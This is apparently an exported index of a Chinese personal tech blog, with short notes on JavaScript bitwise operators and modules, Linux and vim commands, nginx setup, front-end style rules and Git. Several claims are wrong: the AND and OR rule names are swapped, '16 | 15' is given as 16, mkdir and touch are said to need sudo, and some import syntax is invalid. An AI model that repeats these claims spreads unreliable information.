  <entry>
    <title><![CDATA[被遗忘的位运算符]]></title>
    <url>%2Fblog%2Fjavascript%2F%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6.html</url>
    <content type="text"><![CDATA[前言整数：ECMAScript整数包括有符号整数（允许正数和负数）和无符号整数（只允许正数），在ECMAScript中，所有整数字面量默认都是有符号整数 有符号整数：数值范围从-2147483648到2147483647 无符号整数：数值范围从0到4294967295 123var i = 18, j = -18;alert(i.toString(2)); // -&gt; '10010'alert(j.toString(2)); // -&gt; '-10010' 位运算符NOT(~)1、把运算符转为32位二进制数字 2、再转为它的二进制反码 3、把二进制反码转为浮点数 简：对数字求负，然后减1，比如～25 === -26 位运算符AND(&amp;)它对数字的二进制进行操作，把数字转换为二进制后，把每个数字的数对齐，不够补0，然后以下面的规则进行OR运算： 1 对 1 -&gt; 1 1 对 0 -&gt; 0 0 对 1 -&gt; 0 0 对 0 -&gt; 0 因此， 16 &amp; 15 = 0， 15 &amp; 14 = 14 1234516: 1000015: 01111----------------00: 0000000: 0 1234515: 0111114: 01110----------------00: 0111000: 14 位运算符OR(|)它对数字的二进制进行操作，把数字转换为二进制后，把每个数字的数对齐，不够补0，然后以下面的规则进行AND运算： 1 对 1 -&gt; 1 1 对 0 -&gt; 1 0 对 1 -&gt; 1 0 对 0 -&gt; 0 因此， 16 | 15 =16， 15 | 14 = 15 1234516: 1000015: 01111----------------00: 1111100: 16 1234515: 0111114: 01110----------------00: 0111100: 15 左移运算(&lt;&lt;)有符号右移运算(&gt;&gt;)无符号右移运算(&gt;&gt;&gt;)用例“4”的整数次幂（链接：http://web.jobbole.com/86290/） 给定一个32位有符号整数（32 bit signed integer），写一个函数，检查这个整数是否是“4”的N次幂，这里的N是非负整数。不使用常规循环和遍历 思路：利用二进制位数 和 位运算符 &amp; 解决 123440 = 1B41 = 100B42 = 10000B43 = 1000000B 也就是每个数比上一个数的二进制后面多两个零嘛。最重要的是，“4”的幂的二进制数只有 1 个“1”。判断一个二进制数只有 1 个“1”，只需要： 1(num &amp; num - 1) === 0 但是，二进制数只有 1 个“1”只是“4”的幂的必要非充分条件，因为“2”的奇数次幂也只有 1 个“1”。所以，我们还需要附加的判断： 1(num &amp; num - 1) === 0 &amp;&amp; (num &amp; 0xAAAAAAAA) === 0 为什么是 num &amp; 0xAAAAAAAA === 0? 因为这个确保 num 的二进制的那个 “1” 出现在“奇数位”上，也就确保了这个数确实是“4”的幂，而不仅仅只是“2”的幂 最终结果： 12345function isPowerOfFour(num) &#123; return num &gt; 0 &amp;&amp; (num &amp; (num-1)) === 0 &amp;&amp; (num &amp; 0xAAAAAAAA) === 0;&#125;;]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux创建桌面图标]]></title>
    <url>%2Fblog%2Flinux%2Flinux%E5%88%9B%E5%BB%BA%E6%A1%8C%E9%9D%A2%E5%9B%BE%E6%A0%87.html</url>
    <content type="text"><![CDATA[如果是系统自带的程序，默认的桌面图标放在 /usr/share/applications/下面，可以直接将对应的图标放到当前用户的~/Desktop/目录下即可 如果是从网上下载已编译的二进制文件(eclipse之类的)，可以进行手动的创建 将以下代码放在一个sublime.desktop的文件中，并复制到桌面上，授予可执行权限即可： 12345678910111213141516171819[Desktop Entry]Categories=Development;Comment[zh_CN]=Comment=Exec=/home/zhxia84/software/tool/SublimeText2/sublime_textGenericName[zh_CN]=IDEGenericName=IDEIcon=/home/zhxia84/software/tool/SublimeText2/Icon/32x32/sublime_text.pngMimeType=Name[zh_CN]=sublimeName=sublimePath=StartupNotify=trueTerminal=falseType=ApplicationX-DBUS-ServiceName=X-DBUS-StartupType=X-KDE-SubstituteUID=falseX-KDE-Username=owen 参考：http://www.cnblogs.com/xiazh/p/3821863.html]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux安装QQ]]></title>
    <url>%2Fblog%2Flinux%2Flinux%E5%AE%89%E8%A3%85QQ.html</url>
    <content type="text"><![CDATA[Wine QQ7.8 支持的版本：ubuntu 12.04，32位由于时间及人手原因，没有来得及测试其他发行版，此版本基于32位ubuntu 12.04开发，也请大家多多帮助测试其他发行版，非常感谢！ 安装方法：ubuntu系统安装说明：如以前装过其他版本的Wine QQ，请先卸载（通过dpkg -l | grep qq查看），然后运行：sudo dpkg -i WineQQ7.8-20151109-Longene.deb 非Ubuntu系统：1、解压deb包2、按照deb的目录结构，复制的对应的目录，如把opt目录下的所有文件复制到系统的/opt目录下，3、在终端运行qq即可 成功后的截图： 是不是很开心^_^ 我自己安装的目前存在一些问题，一旦网络切换（电脑没网的情况下）就会自动掉线，而且还不能重新登录，重启电脑或将QQ进程杀死后才能重开。 掉线后处理：1、杀进程123ps -ef | grep qqkill -9 ** 2、重启 虽然有这些问题，但总比没有要好，凑合着用吧！哈哈！ 下载地址百度网盘参考链接]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux安装微信]]></title>
    <url>%2Fblog%2Flinux%2Flinux%E5%AE%89%E8%A3%85%E5%BE%AE%E4%BF%A1.html</url>
    <content type="text"><![CDATA[Electronic WeChat Electronic WeChat 是利用 Electron 开源框架而打造的一款第三方微信客户端，目前支持 Linux 和 Mac OS X 系统。 Electronic WeChat 具有一些不错的特性，包括拖入图片、文件即可发送，能够阻止他人撤回消息，可以显示贴纸消息，以及直接打开重定向的链接等等。 要在 Linux 下安装 Electronic WeChat，可以下载 linux-x64.tar.gz（64 位，选择适合自己系统的架构）后执行： tar zxvf linux-x64.tar.gz cd dist/Electronic\ WeChat-linux-x64 ./Electronic\ WeChat 然后使用手机扫描二维码即可登录。 看到下面的图是不是很开^_^ 参考：https://github.com/geeeeeeeeek/electronic-wechat参考：https://github.com/geeeeeeeeek/electronic-wechat/releases]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux安装搜狗输入法后失效的解决办法]]></title>
    <url>%2Fblog%2Flinux%2Flinux%E5%AE%89%E8%A3%85%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E5%90%8E%E5%A4%B1%E6%95%88%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html</url>
    <content type="text"><![CDATA[方法一:重新启动搜狗输入法通过下面的两个命令重启搜狗输入法,看重启之后是否可以正常使用:12~$ killall fcitx~$ killall sogou-qinpanel 方法二:检查修复安装依赖因为我是在正常使用下出现的问题,所以不是安装依赖的问题不适用,刚安装好的朋友如果无法使用,可以用下面的领了排查或者修复安装依赖问题1~$ sudo apt-get install -f 方法三：删除配置文件，重启搜狗ubuntu下搜狗的配置文件在 ~/.config下的3个文件夹里： SogouPY、SogouPY.users、sogou-qimpanel 删除这3个文件夹，然后重启搜狗。 我使用方法三解决了无法输入中文问题。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux常用命令]]></title>
    <url>%2Fblog%2Flinux%2Flinux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html</url>
    <content type="text"><![CDATA[Linux常用命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122根目录表示： pm@pm-pc:/$主文件目录表示： pm@pm-pc:~$超级用户主目录表示：root@pm-pc:~# （输入sudo -i 可以切换到root权限，按ctrl+d 可退出root权限）cd 改变目录# cd home 或 cd /home 查找home目录并定位# cd home/pm 查找home目录下的pm目录并定位# cd ~ 回到用户目录# cd .. 返回上一级# cd ../.. 返回上两级ls 查看文件详情# ls -a 列出文件下的所有文件# ls -l 列出文件的详细信息# ls -al 列出文件下的所有文件的详细信息# ls -s 在每个文件的后面打印出文件大小# ls -t 按时间进行排序# ls -R 将目录下的所有子目录都列出来# ls -S 以文件大小进行排序# ls -L 列出文件的Link链接# 注意大小写参数的区别cp 复制（将前面的文件复制到后面的文件中，若最后的文件不存在，则报错，加-R复制目录）# cp file1 file2 将文件file1复制到文件file2# cp file1 file2 file3 将文件file1和file2复制到文件file3# cp -i file1 file2 采用交互方式将文件file1复制到文件file2# cp -f file1 file2 因file2已存在所以强制将文件file1复制到文件file2# cp -R dir1 dir2 将目录dir1复制到dir2中# cp -R file1 file2 dir1 dir2 将fiel1、file2、目录dir1复制到dir2中mv 移动或重命名（将前面的文件移动到后面的文件中）# mv test.log test1.txt 将文件test.log重命名为test1.txt（因为都是文件而不是文件夹，所以只能改名不能移动）# mv test1.txt file1 将文件test1.txt移动到fiel1文件夹中# mv log1.text log2.text log3.text file1 将文件og1.text、log2.text、log3.text都移动到file1文件夹中# mv -i file1 file2 将file1文件夹移动到file2文件夹中，如果存在，则询问# mv -f file1 file2 将file1文件夹移动到file2文件夹中，即使存在，也会直接覆盖# mv -u file1 file2 将file1文件夹移动到file2文件夹中，如果存在，当源文件file1更新时，才会更新# mv dir1 dir2 将dir1目录移动到dir2目录中，如果dir2不存在，则为重命名# mv * ../ 移动当前文件夹下的所有文件到上一级目录# mv log1.txt -b log2.txt 加-b表示文件在覆盖前做简单备份mkdir 创建文件夹（必须增加sudo 最高权限）# sudo mkdir aa 在当前文件夹下创建文件夹aa# sudo mkdir aa/bbb/cccc 创建该目录下的文件夹cccctouch 创建文件 （必须增加sudo 最高权限）# sudo touch aa.txt 在当前目录下创建文件aa.txt# sudo touch aa/bbb/cccc.txt 创建该目录下的文件cccc.txtrm 删除文件或文件夹 （必须增加sudo 最高权限，删除文件必须加-rf）# sudo rm aa.js 删除当前目录下的aa.js# sudo rm aa/bbb/cccc.js 删除该目录下的文件cccc.js# sudo rm -f aa.js 强制删除当前目录下的aa.js# sudo rm -f aa/bbb/cccc.js 强制 删除该目录下的文件cccc.js# sudo rm -i aa.js 先询问再删除当前目录下的aa.js# sudo rm -i aa/bbb/cccc.js 先询问再删除该目录下的文件cccc.js# sudo rm -rf aa 删除当前目录下的文件aa# sudo rm -rf aa/bbb/cccc 删除该目录下的文件ccccpwd 查看完整路径# pwdapt-get 安装文件（每种系统的命令不一致，Ubuntu的命令为apt-get，最高权限sudo安装）# sudo apt-get install **ifconfig 查看IP地址（不能再超级用户root下查找）# ifconfig 查找所有ip信息# ifconfig | grep 192 使用grep快速查找处192的信息grep 管道符过滤# ifconfig | grep 192 查找打印ip地址# grep word file_name 打印file_name文件中的word字符串所在的一行# grep -i Word file_name 打印file_name文件中的Word或word（不区分大小写）字符串所在的一行# grep -c wordfile_name 打印file_name文件中word字符串的个数# grep -n wordfile_name 打印file_name文件中word字符串所在的一行并列出行数# grep -w word file_name 打印file_name文件中word字符串（只匹配整个单词，不匹配字符串的一部分，如word_name不算）所在的一行并列出行数# grep word file_name --color 打印file_name文件中的word字符串所在的一行并给***高亮ssh 通过ip地址访问局域网电脑ssh pm@192.168.20.133 （通过ip连接系统）12**** （电脑密码）杀死进程：# ps -ef | grep node # 查看node进程是否存在，-e表示显示所有进程，-f表示全格式，-ef表示两者# 找到被占用进程，查找第二个参数id号，假定为10001# kill -9 10001 # 杀死解除端口占用1.查找被占用的端口# netstat -tln# netstat -tln | grep 802.查看端口属于哪个程序# lsof -i :803.杀死端口被占用的进程# kill -9 进程id查看系统软件状态# service *** status系统软件重启# service *** restart清空终端# Ctrl + L更改主机名# vim /etc/hosts 查看# sudo vim /etc/hosts 修改 # 如：输入127.0.0.1 hongbaocloud.com 保存修改并退出后，原先访问的127.0.0.1或localhost就可以改为hongbaocloud.com访问了 # 注：vim编辑器只是其中一个选择，也可以选择其他的编辑器（如subl或atom）打开文件并修改配置]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux点击链接打开chrome显示空页面解决办法]]></title>
    <url>%2Fblog%2Flinux%2Flinux%E7%82%B9%E5%87%BB%E9%93%BE%E6%8E%A5%E6%89%93%E5%BC%80chrome%E6%98%BE%E7%A4%BA%E7%A9%BA%E9%A1%B5%E9%9D%A2.html</url>
    <content type="text"><![CDATA[Ubuntu 点击链接弹出chrome是空白页 原因： 1~/.local/share/applications/ 该目录下有google-chorome.desktop文件，浏览器会优先使用.local下的配置 解决办法：1sudo vim google-chrome.desktop 修改，或者删除该文件即可1Exec=/opt/google/chrome/chrome %U]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux目录解释]]></title>
    <url>%2Fblog%2Flinux%2Flinux%E7%9B%AE%E5%BD%95%E8%A7%A3%E9%87%8A.html</url>
    <content type="text"><![CDATA[Linux 根目录计算机下的根目录 (pm@pm-pc:/$ ) 12345678910111213/bin # 存放必要的命令/boot # 存放内核以及启动所需的文件等/dev # 存放设备文件/etc # 存放系统的配置文件/home # 用户文件的主目录，用户数据存放在其主目录中/lib # 存放必要的运行库/mnt # 存放临时的映射文件系统，我们常把软驱和光驱挂装在这里的floppy和cdrom子目录下。/proc # 存放存储进程和系统信息/root # 超级用户的主目录/sbin # 存放系统管理程序/tmp # 存放临时文件的目录/usr # 包含了一般不需要修改的应用程序，命令程序文件、程序库、手册和其它文档。/var # 包含系统产生的经常变化的文件，例如打印机、邮件、新闻等假脱机目录、日志文件、格式化后的手册页以及一些应用程序的数据文件等等。建议单独的放在一个分区。[separator] home目录1/home 主文件夹目录 个人电脑1/home/pm/ # (pm@pm-pc:) (终端默认) 各文件123456/Project/Deskup/Documents/Downloads/Music...... 操作使用cd **和cd ..来进入和退出目录]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu系统配置nginx服务器]]></title>
    <url>%2Fblog%2Flinux%2Fubuntu%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AEnginx%E6%9C%8D%E5%8A%A1%E5%99%A8.html</url>
    <content type="text"><![CDATA[ssh登录12ssh root@ip地址输入密码，回车 安装nginx1、选定源码目录，原则上可以是任何目录。这里我选择/usr/local/src：1cd /usr/local/src # 进到src目录 2、安装PCRE库，zlib库，ssl（某些vps默认没装ssl)：1sudo apt-get install libpcre3 libpcre3-dev libpcrecpp0v5 libssl-dev zlib1g-dev 3、安装Nginx：Nginx 一般有两个版本，分别是稳定版和开发版，您可以根据您的目的来选择这两个版本的其中一个，下面是把 Nginx 安装到 /usr/local/nginx 目录下的详细步骤：(注意：需要在sudo下)12345678910111213cd /usr/local/srcwget http://nginx.org/download/nginx-1.13.1.tar.gztar -zxvf nginx-1.13.1.tar.gzcd nginx-1.13.1./configuremakemake install 4、查看端口状态：1netstat -ano|grep 80 5、启动Nginx1sudo /usr/local/nginx/sbin/nginx 6、打开浏览器访问机器的IP，如果看到如下图，恭喜你安装成功了！ 修改nginx配置1、进到配置文件123cd /usr/local/nginx/confvi nginx.conf 2、修改修改server模块（可配置多个server模块）默认情况下，会指向nginx文件夹下的html文件夹，这里我们修改为：/home/files;，后续只需要将我们的文件存放在/home/files目录下即可 3、反向代理我们可以把server模块修改成下面这样：1234567server &#123; listen 8080; server_name localhost; # 如果需要配置二级域名，此处填写即可，如 work.pimichen.com location / &#123; proxy_pass http：//127.0.0.1:8899; # 代理的地址 &#125;&#125; 上面的意思：监听公网地址的8080端口，并将通过此端口的请求代理到服务器本地nodejs服务的8899端口（跑node服务器时设定的）上面。如123node程序运行后应该是：127.0.0.1:8899访问：公网ip地址:8080 即可实现代理 注：80端口为http的默认端口，443端口为https的默认端口 4、重载配置1sudo /usr/local/nginx/sbin/nginx -s reload]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim编辑器相关操作]]></title>
    <url>%2Fblog%2Flinux%2Fvim%E7%BC%96%E8%BE%91%E5%99%A8%E6%93%8D%E4%BD%9C.html</url>
    <content type="text"><![CDATA[vim快捷键常用操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114需使用sudo apt-get install vim(mac安装：sudo homebrew install vim)安装终端输入vim即可进入到vim编辑器：# vim不保存退出vim编辑器：# :q! &lt;Enter&gt;跳到vim之外（需小心，所有的改变都会丢失）# :qa!&lt;Enter&gt;保存修改的文件并退出：# :wq &lt;Enter&gt; / :wq! &lt;Enter&gt;回到正常状态：# Esc撤销：# u：从最后执行的命令挨个撤销(只能撤销未保存退出的)往回撤销：# Ctrl - R：撤销撤销命令移动光标：挨个移动：# up(k)、down(j)、left(h)、right(l)整屏移动：# &lt;Ctrl-f&gt;：向下移动一屏()# &lt;Ctrl-d&gt;：向下移动半屏(down)# &lt;Ctrl-b&gt;：向上移动一屏()# &lt;Ctrl-u&gt;：向上移动半屏(up)其他快速移动：# 0：移动到行首# 2w：向前移动到2个单词的首字母# 3e：向前移动到3个单词的末尾# G：到文件尾# gg：到文件首# numG：移动光标到指定的行（num）。（比如 10G 就是到第 10 行）# &lt;Ctrl - g&gt;：查看当前行信息：文件名、行号、全文行号、占全文百分比、列号# H：移动光标到屏幕上面# M：移动光标到屏幕中间# L：移动光标到屏幕下面单词自动补全：# Ctrl + D 或 Tab删除：# x：删除一个字母# dd：删除一个当前行# 2dd：删除连续的两行# cw/ce：删除当前单词并进入插入模式，可修改当前错误单词# c$：删除当前行在光标后面的所有字符并进入插入模式，大幅修改添加：# a：在光标处添加，类似i替换：# r：点击r后即可替换当前1个字符，使用单个字符的修改插入：# i：在当前字符的左边插入# I：在当前行首插入# a：在当前字符的右边插入# A：在当前行尾插入# o：在当前行下面插入一个新行# O：在当前行上面插入一个新行选择（高亮）：# v：按字符选择。经常使用的模式，所以亲自尝试一下它。# V：按行选择。这在你想拷贝或者移动很多行的文本的时候特别有用。# Ctrl +V：按块选择。非常强大。剪切、复制：# d：剪贴选择的内容到剪贴板。# y：拷贝选择的内容到剪贴板。# c：剪贴选择的内容到剪贴板并且进入插入模式。## dd：剪切当前行。# yy：拷贝当前行。# cc：剪切当前行并且进入插入模式。## D：剪切从光标位置到行尾到剪贴板。# Y：拷贝当前行。# C：和 D 类似，最后进入插入模式。## x：剪切当前字符到剪贴板。# s：和x类似，不过最后进入插入模式。粘贴：# p：粘贴（当前一步为删除操作时，删除的字符会存在寄存器中，此时按p会在当前光标的下一行粘贴插入）搜索查找：# /error： / + 需要搜索的单词，可顺向查找，输入n可查找到下一个，输入N可反方向查找到下一个# ?error：？ + 需要搜索的单词，可逆向查找匹配括号：# %：光标定位在括号的某一处，输入%后光标自动切换到匹配的另外一处在VIM中输入外部命令：# ！：输入！+ 外部命令，如！+ls多行注释：# 1、ESC进入命令行模式# 2、ctil + v 进入VISUAL BLOCK模式# 3、控制上下选择行数# 4、I或shift + i 进入插入模式# 5、输入注释符号# (此时视觉上只看到对第一行注释)# 6、按下ESC，片刻之后就会自动注释多行删除多行注释：# 1、ESC进入命令行模式# 2、ctil + v 进入VISUAL BLOCK模式# 3、控制上下选择行数# 4、按下b即可删除注释符号]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello Hexo]]></title>
    <url>%2Fblog%2Fother%2Fhexo.html</url>
    <content type="text"><![CDATA[博客框架: Hexo Website、Hexo GitHub博客主题: Hexo-theme-next Website、Hexo-theme-next GitHub Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Startinstall1234567$ npm install hexo-cli -g$ hexo init blog$ cd blog$ npm install Start CreateCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <tags>
        <tag>Other</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端开发规范]]></title>
    <url>%2Fblog%2Fother%2F%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83.html</url>
    <content type="text"><![CDATA[通用 用2个空格缩进 文件、目录名全部小写，单词之间用”_”隔开 文件统一采用UTF-8编码 删除行位多余的空格 HTML 标签合理化，对于兼容性要求不高的可使用HTML5的语义化标签，如header、footer、article、section等 标签合理嵌套，越短越好，dom层级尽量简单 尽量使用class，少用id class、id命名形象化，一律采用小写，单词之间”-“隔开，不允许使用大写字母和”_” 自定义的属性以”data-“开头 属性编写顺序： class id,name data-* src,for,type,href,value title,alt role,aria-* meta IE 兼容模式&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;&gt; CSS 不要使用@import，这种指令要慢很多，会增加请求次数，多使用link或使用sass等预处理器 用两个空格代替tab，保证能在所有环境下展现一致 少使用浮动、定位等布局 尽量减少选择器的层级 CSS左括号与选择器同行，右括号另起一行，左花括号前空一格 CSS选择器尽量用用class，少使用标签，如p{}、.test p{}等 不要在rgb()、rgba()值内部的括号中的逗号后面插入空格 对于属性值和颜色知，省略小于1的小数前面的0，如.5代替0.5，-.5px代替-0.5px 十六进制应该全部小写，且尽量使用简写形式，例如#fff 避免给0值指定单位 为选择器的属性添加双引号，如input[type=&quot;text&quot;] 选择器分组时，将单独的选择器单独放一行 CSS样式一行只写一条，可读性高 媒体查询尽量放在相关规则的地方，否则容易遗忘 带前缀的属性，让每个属性在垂直方向对齐，便于阅读 1234567/* bad css */.selector, .selector-secondary, .selector[type=text] &#123; padding:15px; margin:0px 0px 15px; background-color:rgba(0, 0, 0, 0.5); box-shadow:0px 1px 2px #CCC,inset 0 1px 0 #FFFFFF&#125; 12345678910/* good css */.selector,.selector-secondary,.selector[type="text"] &#123; padding: 15px; margin-bottom: 15px; background-color: rgba(0,0,0,.5); -webkit-box-shadow:0px 1px 2px #CCC,inset 0 1px 0 #FFFFFF box-shadow:0px 1px 2px #CCC,inset 0 1px 0 #FFFFFF&#125; JavaScript 变量名、函数名使用小驼峰，如requestFlag 类名使用大驼峰，如ClassData 常量名全面大写并用”_”分隔，jQuery变量使用$开头 在后端返回的数据list中增加前端字段，用”_”开头，区分前后端字段 少使用全局变量和全局函数 代码过多时考虑进行封装 语句以分号结束 避免使用多行注释/**/，多使用单行注释// 文件注释开发者信息能够体现开发人员对文件的贡献，这样便于team其他人员快速找到出处，便于后期维护 123/** * Created by Pimi.chen on 2017/04/30. */ 如果是页面html、css由制作同学开发，js由交互同学开发，交互同学拿到页面后如需要在dom中补充class或id，以”JS-“开头，区分css和js所需类 IMG 格式：透明图片使用png，不透明的使用jpg 上线前必须使用tinypng进行压缩图片]]></content>
      <tags>
        <tag>Other</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[export和module.export语法]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs-module.html</url>
    <content type="text"><![CDATA[export（es6语法） 参考：阮一峰 export命令 在vue中，可以将所有的外部函数、变量等写在一个外部的js文件中并使用export暴露出来，再在相关的组件中import相应的函数或变量 method.js：123456789101112131415161718192021function aa (a, b) &#123; ***** ***** ***** return ***;&#125;function bb (c, d) &#123;&#125;var cc;var dd;输出1（输出多个）：export &#123;aa, bb, cc ,dd&#125; 输入1（对应输入时加括号）：import &#123;aa&#125; from &apos;&apos;输出2（输出一个）：export default aa输入2（对应输入时无括号）：import aa from &apos;&apos; 组件：1234567import &#123;aa, cc&#125; from &apos;method.js&apos; // import 需要的变量或函数import * from &apos;method.js&apos; // 当需要import所有的变量或函数时methods : &#123; var mn = aa(123, 456);&#125;组件里面可以直接使用method.js里面的函数或变量，如果放在组件里面，则需要使用this.aa(), 这样会造成文件过长，不易阅读，且重用性差 module.exports（node语法）Module.exports导出的其实是整个模块对象 exports（node语法） 参考:小白妹妹写代码 module.export和export exports是对Module.exports的一种引用，常规情况下，两者基本一致，可以混用，但部分情况下不可 例1：OK12345module.exports.name = '小白妹妹';exports.age = 10;module.exports.print = function()&#123; console.log(12345)&#125;; 例2：OK123456789module.exports = &#123; name = '小白妹妹';&#125;;exports.age = 10;module.exports.print = function()&#123; console.log(12345)&#125;; 例3：ERROR123456789module.exports = &#123; name = '小白妹妹';&#125;;exports = &#123; age:10&#125;; // exports现在是&#123;age:10&#125;这个对象的引用，不再是module.exports的引用了console.log(module); //你会看到Module的exports中只有name属性！！ 例4：ERROR12345678exports.age = 10;console.log(module); //你会看到Module的exports中多了age属性module.exports = &#123; name = '小白妹妹';&#125;;console.log(module); //你会看到Module的exports中还是只有name属性！！！ 使用 例1：es6 export单个变量或方法导出导入 1234567891011121314A.js:function a () &#123;&#125;// 输入：export default a B.js:// 输入：import a from 'A.js'// 使用：a() 例2：es6 export多个变量或方法导出导入 1234567891011121314151617181920212223242526A.js:function a () &#123;&#125;function b () &#123;&#125;function c () &#123;&#125;// 输出:export &#123;a, b, c&#125;B.js:// 输入1：import &#123;a, b, c&#125; from 'A.js'// 使用1：a()、b()、c()// 输入2 或*号全部导出：import * as method from 'A.js'// 使用2：method.a()、method.b()、method.c() 例3：Node.js module.exports 多个变量或方法导入导出 12345678910111213141516171819202122232425262728293031A.js:function a () &#123;&#125;function b () &#123;&#125;function c () &#123;&#125;// 输出：module.exports &#123;a, b, c&#125;B.js:// 输入1：import &#123;a, b, c&#125; from 'A.js'// 使用1：a()、b()、c()// 输入2 或*号全部导出：import * as method from 'A.js'// 使用2：method.a()、method.b()、method.c()// 输入3 别名全部导出（当只有一个方法时不支持别名导出）：import method from 'A.js'// 使用3method.a()、method.b()、method.c() 例4：Node.js 使用Module.exports直接导出 12345678910111213141516171819202122232425A.js:// 直接输出module.exports = &#123; a: function() &#123;&#125;, b: function() &#123;&#125;, c: function() &#123;&#125;&#125;B.js:// 输入1：import &#123;a, b, c&#125; from 'A.js'// 使用1：a()、b()、c()// 输入2：import method from 'A.js'// 使用2：method.a()、method.b()、method.c() 例5：Node.js exports 导出失败，不可用 12345678910111213A.js:function a () &#123;&#125;function b () &#123;&#125;function c () &#123;&#125;// 输出exports &#123;a, b, c&#125;B.js:// 输入import &#123;a, b, c&#125; from 'A.js' 总结1、es6 export支持：default aa 导出aa导入、{aa, bb}导出{aa, bb}导入、* as method全部导入 2、es6 export不支持：别名导入 3、node.js module.exports支持：{aa, bb}导出{aa, bb}导入、* as method全部导入、method别名导入 4、node.js module.exports不支持： 5、node.js exports 不支持：少于exports 6、require对应的是module.export]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ajax规范]]></title>
    <url>%2Fblog%2Fjquery%2Fajax%E8%AF%B7%E6%B1%82%E8%A7%84%E8%8C%83.html</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526272829303132$.ajax(&#123; url: '', type: '', dataType: 'json', timeout: 3000, data: &#123; num1: num1, num2: num2 &#125;, beforeSend: function(xhr, settings) &#123; // 发送请求前 console.log('beforeSend', xhr, settings); &#125;, success: function(data, status, xhr) &#123; // 请求成功 console.log('success', data, status, xhr); if (data.code === 200) &#123; console.log('处理成功'); &#125; else &#123; console.log('处理失败'); &#125; &#125;, error: function(xhr, errorType, error) &#123; // 请求失败 console.log('error', xhr, errorType, error); alert('请求失败'); &#125;, complete: function(xhr, status) &#123; // 请求成功或失败都执行 console.log('complete', xhr, status); &#125;&#125;);]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery实现大转盘效果]]></title>
    <url>%2Fblog%2Fjquery%2Fjquery%E5%AE%9E%E7%8E%B0%E5%A4%A7%E8%BD%AC%E7%9B%98%E6%95%88%E6%9E%9C.html</url>
    <content type="text"><![CDATA[插件： jQueryRotate.2.2 支持：ie8旋转插件 效果： 下载：百度云盘]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git ssh key操作]]></title>
    <url>%2Fblog%2Fgit%2Fssh_key.html</url>
    <content type="text"><![CDATA[12345ssh-keygen -t rsa -C "$your_email" // 生成SSH KEYcat ~/.ssh/id_rsa.pub // 列出SSH KEYclip -sel clip &lt; ~/.ssh/id_rsa.pub // 将SSH KEY复制到粘贴板]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git Init]]></title>
    <url>%2Fblog%2Fgit%2Fgit%E5%88%9D%E5%A7%8B%E5%8C%96.html</url>
    <content type="text"><![CDATA[对于首次上传项目到github或企业gitlab12345678910111213新建projectcd ~/projectgit initgit add .git commit -m "***"git remote ... // 与远程仓库建立连接git push -u origin master]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git常用命令]]></title>
    <url>%2Fblog%2Fgit%2Fgit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html</url>
    <content type="text"><![CDATA[经常忘记git的一些命令，so还是把常用的一些命令记下来，忘记了再来查 git和svn的区别 svn是集中式版本控制系统 git是分布式版本控制系统 git常用命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# init初始化mkdir aacd aagit init # 把当前目录变成git可以管理的仓库，初始化# add添加git add readme1.txt # 把文件1添加到仓库git add readme2.md # 把文件2添加到仓库# commit提交git commit -m "添加的是什么文件" # 把文件提交到仓库（-m后面的是本次提交的说明）# add和commit的区别# 操作共两步，先add，后commit# 因为commit可以一次提交很多文件，所以可以多次add不同的文件git add file1.txtgit add file2.txt file3.txtgit commit -m "add file1、file2 and file3"# status仓库状态git status # status命令可以时刻掌握仓库当前的状态# diff差异git diff # diff命令可以比较版本差异# log版本# git log log命令可以查看历史记录（从近到远）# checkout撤销工作区（本地）修改git checkout --readme.txt # 把 readme.txt 文件在工作区的修改全部撤销# 